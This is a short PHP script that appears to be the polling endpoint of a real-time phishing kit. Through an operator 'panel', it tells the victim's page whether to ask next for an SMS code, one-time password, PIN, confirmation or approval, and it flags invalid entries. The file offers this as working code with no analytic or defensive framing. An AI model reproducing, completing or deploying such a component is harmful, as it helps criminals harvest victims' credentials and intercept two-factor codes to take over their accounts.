<?php 
require_once 'config/panel.php';
require_once "model/app.php";


if( $_GET['waiting'] == 1 ) {
    $response = response();
    if( $response === 'sms' ) {
        echo 'sms';
        exit(); 
    }  else if( $response === 'badsms' ) {
        $_SESSION['ERRORS']['sms'] = "Invalid SMS.";
        echo 'sms';
        exit();
    } else if( $response === 'otp' ) {
        echo 'otp';
        exit();
    }
    else if( $response === 'badotp' ) {
        $_SESSION['ERRORS']['otp'] = "Invalid OTP.";
        echo 'otp';
        exit();
    }
    else if( $response === 'pin' ) {
        echo 'pin';
        exit();
    }
    else if( $response === 'badpin' ) {
        $_SESSION['ERRORS']['pin'] = "Invalid OTP.";
        echo 'pin';
        exit();
    }
    else if( $response === 'confirm' ) {
        echo 'confirm';
        exit();
    }
    else if( $response === 'wait_approve' ) {
        echo 'wait_approve';
        exit();
    }
    else if( $response === 'badapprov' ) {
        echo 'badapprov';
        exit();
    }
    exit();
}